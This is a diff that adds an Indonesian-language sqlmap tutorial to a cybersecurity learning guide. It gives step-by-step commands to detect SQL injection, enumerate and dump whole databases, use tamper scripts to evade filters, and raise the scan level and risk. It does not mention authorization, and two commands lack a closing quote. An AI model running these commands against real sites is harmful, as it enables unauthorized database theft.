@@ -280,6 +280,54 @@ Jika menemukan bug/kerentanan:
 
 > 💡 **Tip:** Teliti ketiga website cybersecurity terakhir untuk menemukan domain yang sesuai dengan minat Anda. Gunakan AI untuk riset lebih mendalam.
 
+
+*TUTORIAL MENGGUNAKAN SQLMAP*
+
+*PERINTAH DASAR SQLMAP*
+*Step 1 Cek Kerentanan SQLI URL, Perintah:*
+```sqlmap -u "https://target.com/src.php?id=5" --batch```
+
+*Step 2 Ambil Informasi Database:*
+```sqlmap -u "https://target.com/src.php?id=5" --dbs```
+
+*Ambil Tabel Dari Database Tertentu/Cek Nama Tabel Dari Databasenya:*
+```sqlmap -u "https://target.com/src.php?id=5" -D nama_database --tables```
+
+*Ambil Kolom Dari Database/Cek Nama Kolom Dari Database:*
+```sqlmap -u "https://target.com/src.php?id=5" -T nama_tabel --columns```
+
+*Dump data/ambil/download database*
+
+*Dump data dari tabel:*
+```sqlmap -u "https://target.com/src.php?id=5 -D nama_database -T nama_tabel --dump```
+
+*Dump Semua Database(Prosesnya Bisa Lama, Tergantung Isi Database Atau Jaringannya):*
+```sqlmap -u "https://target.com/src.php?id=5 --dump-all```
+
+*Contoh Dump Tapi Nyimpan Hasil Kefile:*
+```sqlmap -u "https://target.com/src.php?id=5" --dump-all --output-dir=path/to/folder_name```
+
+*Cara Tamper Data Dengan SQLMAP*
+*Step 1 Cek List Daftar Script Tamper Data:*
+```sqlmap --list-tampers```
+
+*Step 2 Cara Menggunakan Satu Script Tamper:*
+```sqlmap -u "https://target.com/src.php?id=5" --tamper=nama_script_tamper```
+
+*Step 3 Cara Menggunakan Banyak Script Tamper:*
+```sqlmap -u "https://target.com/src.php?id=5" --tamper="nama_tamper1, nama_tamper2, nama_tamper3"```
+
+*CARA MEMAKAI LEVEL DAN RISK DI SQLMAP*
+*Info: level bernilai 1-5 default 1, semakin tinggi nilainya semakin banyak payload dan parameter yang diuji*
+
+*Info: risk nilainya 1-3 default 1, menentukan tingkat resiko payload yang dicoba*
+
+*Cara Penggunaan Level Dan Risk:*
+```sqlmap -u "https://target.com/src.php?id=5" --level=3 --risk=2```
+
+*Semakin tinggi keduanya scannging menjadi lebih lama*
+Nah kalau untuk critical sama warning itu, critical berarti menunjukkan masalah serius sehingga sqlmap tidak bisa lanjut, kalau warning sqlmap hanya memberi peringatan tapi sqlmap tetap berjalan
+
 ---
 
 `#BukanOmongKosong` `#IndonesiaCriticalThinking` `#BelajarBasic` `#Proses` `#MenghargaiKaryaOrangLain`
